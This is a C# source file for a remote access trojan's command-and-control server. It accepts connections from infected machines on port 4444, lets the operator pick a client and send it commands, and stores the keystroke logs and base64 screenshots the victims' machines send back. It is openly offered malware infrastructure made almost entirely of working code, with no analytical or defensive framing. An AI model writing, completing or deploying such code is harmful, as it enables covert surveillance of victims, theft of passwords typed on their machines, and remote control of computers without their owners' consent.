using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Threading;

class RATServer
{
    private static List<ClientHandler> clients = new List<ClientHandler>();

    static void Main()
    {
        int listenPort = 4444;
        TcpListener listener = new TcpListener(IPAddress.Any, listenPort);
        listener.Start();
        Console.WriteLine("[+] Listening for incoming connections on port " + listenPort);

        Thread acceptThread = new Thread(() => AcceptConnections(listener));
        acceptThread.Start();

        while (true)
        {
            Console.Clear();
            Console.WriteLine("=== RAT Server ===");
            Console.WriteLine("1. List Clients");
            Console.WriteLine("2. Interact with Client");
            Console.WriteLine("3. Exit");
            Console.Write("Select an option: ");

            string choice = Console.ReadLine();
            switch (choice)
            {
                case "1":
                    ListClients();
                    break;
                case "2":
                    InteractWithClient();
                    break;
                case "3":
                    listener.Stop();
                    return;
                default:
                    Console.WriteLine("Invalid option. Press Enter to continue.");
                    Console.ReadLine();
                    break;
            }
        }
    }

    static void AcceptConnections(TcpListener listener)
    {
        while (true)
        {
            TcpClient client = listener.AcceptTcpClient();
            ClientHandler handler = new ClientHandler(client, clients.Count + 1);
            clients.Add(handler);

            Thread clientThread = new Thread(() => handler.HandleClient());
            clientThread.Start();

            Console.WriteLine($"[+] New connection from {client.Client.RemoteEndPoint} (Client ID: {handler.ClientID})");
        }
    }

    static void ListClients()
    {
        if (clients.Count == 0)
        {
            Console.WriteLine("No clients connected.");
        }
        else
        {
            Console.WriteLine("Connected Clients:");
            foreach (var client in clients)
            {
                Console.WriteLine($"Client ID: {client.ClientID} - {client.ClientIP}");
            }
        }
        Console.WriteLine("Press Enter to continue.");
        Console.ReadLine();
    }

    static void InteractWithClient()
    {
        Console.Write("Enter Client ID to interact with: ");
        if (!int.TryParse(Console.ReadLine(), out int clientID))
        {
            Console.WriteLine("Invalid Client ID.");
            return;
        }

        ClientHandler selectedClient = clients.Find(c => c.ClientID == clientID);
        if (selectedClient == null)
        {
            Console.WriteLine($"Client with ID {clientID} not found.");
            return;
        }

        Console.WriteLine($"Interacting with Client {selectedClient.ClientID}. Type 'back' to return to main menu.");
        selectedClient.Interact();
    }
}

class ClientHandler
{
    public int ClientID { get; }
    public string ClientIP { get; }
    private TcpClient client;
    private NetworkStream stream;
    private StreamReader reader;
    private StreamWriter writer;

    public ClientHandler(TcpClient client, int clientID)
    {
        this.client = client;
        this.ClientID = clientID;
        this.ClientIP = ((IPEndPoint)client.Client.RemoteEndPoint).Address.ToString();
        this.stream = client.GetStream();
        this.reader = new StreamReader(stream);
        this.writer = new StreamWriter(stream);
        writer.AutoFlush = true;
    }

    public void HandleClient()
    {
        try
        {
            Console.WriteLine($"[Client {ClientID}] Handling client...");

            if (!Directory.Exists("logs"))
            {
                Directory.CreateDirectory("logs");
            }

            string line;
            while (!string.IsNullOrWhiteSpace(line = reader.ReadLine()))
            {
                Console.WriteLine($"[Client {ClientID}] Received: {line}"); 
            }

            while (true)
            {
                line = reader.ReadLine();
                if (line == null)
                {
                    Console.WriteLine($"[Client {ClientID}] Disconnected.");
                    break;
                }

                Console.WriteLine($"[Client {ClientID}] Received: {line}"); 

                if (line.StartsWith("[SCREENSHOT]"))
                {
                    string base64Image = line.Replace("[SCREENSHOT] ", "");
                    byte[] imageData = Convert.FromBase64String(base64Image);
                    File.WriteAllBytes($"screenshots/screenshot_{ClientID}_{DateTime.Now:yyyyMMdd_HHmmss}.jpg", imageData);
                    Console.WriteLine($"[Client {ClientID}] Screenshot saved.");
                }
                else if (line.StartsWith("[KEYLOG]"))
                {
                    string logEntry = line.Replace("[KEYLOG] ", "");
                    File.AppendAllText($"logs/keylog_{ClientID}.txt", logEntry + Environment.NewLine); 
                    Console.WriteLine($"[Client {ClientID}] Keylog: {logEntry}");
                }
                else
                {
                    Console.WriteLine($"[Client {ClientID}] {line}");
                }
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"[Client {ClientID} Error] {ex.Message}");
        }
    }
    public void Interact()
    {
        while (true)
        {
            Console.Write($"Client {ClientID}> ");
            string command = Console.ReadLine();

            if (command.ToLower() == "back")
            {
                break;
            }

            writer.WriteLine(command);
        }
    }
}
